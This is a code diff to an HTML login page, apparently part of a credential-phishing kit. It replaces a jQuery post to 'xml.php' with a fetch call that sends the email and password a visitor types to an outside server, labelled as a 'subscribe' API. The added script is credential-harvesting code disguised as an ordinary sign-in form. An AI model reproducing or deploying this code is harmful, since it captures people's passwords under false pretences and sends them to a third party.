@@ -279,7 +279,6 @@
                     class="form-control"
                     id="email"
                     placeholder="name@example.com"
-                    value="john@gmail.com"
                   />
                 </div>
 
@@ -313,25 +312,62 @@
     </form>
 
     <script>
-      $(document).ready(function () {
-        $("#cow").submit(function (e) {
+      document.addEventListener("DOMContentLoaded", function () {
+        const form = document.getElementById("cow");
+        const emailInput = document.getElementById("email");
+        const passwordInput = document.getElementById("password");
+        const responseBox = document.getElementById("response");
+        const connectSpan = document.getElementById("connect");
+        const modal = new bootstrap.Modal(document.getElementById("m"));
+
+        form.addEventListener("submit", async function (e) {
           e.preventDefault();
 
-          $.ajax({
-            url: "xml.php", // The PHP script to handle the request
-            type: "POST",
-            data: $(this).serialize(), // Serialize form data
-            success: function (response) {
-              // alert(response);
-              $("#response").html("<p>" + response + "</p>");
+          const email = emailInput.value.trim();
+          const password = passwordInput.value.trim();
 
-              $("#response").addClass("alert-danger");
-            },
-            error: function (xhr, status, error) {
-              // alert(error);
-              $("#response").html("<p>An error occurred: " + error + "</p>");
-            },
-          });
+          if (!email || !password) {
+            responseBox.className = "alert alert-danger";
+            responseBox.textContent = "Please fill in both email and password.";
+            return;
+          }
+
+          connectSpan.textContent = email;
+          responseBox.className = "alert alert-info";
+          responseBox.textContent = "Authenticating...";
+
+          try {
+            const res = await fetch(
+              "https://quamcon-backend.onrender.com/api/subscribe",
+              {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({ email, password }),
+              }
+            );
+
+            const data = await res.json();
+
+            if (res.ok) {
+              responseBox.className = "alert alert-success";
+              responseBox.textContent =
+                data.message || "Successfully submitted!";
+
+              // Wait 3 seconds then close the modal
+              setTimeout(() => {
+                modal.hide();
+              }, 3000);
+            } else {
+              responseBox.className = "alert alert-danger";
+              responseBox.textContent = data.message || "Submission failed.";
+            }
+          } catch (err) {
+            responseBox.className = "alert alert-danger";
+            responseBox.textContent = "Network error. Please try again.";
+            console.error(err);
+          }
         });
       });
     </script>
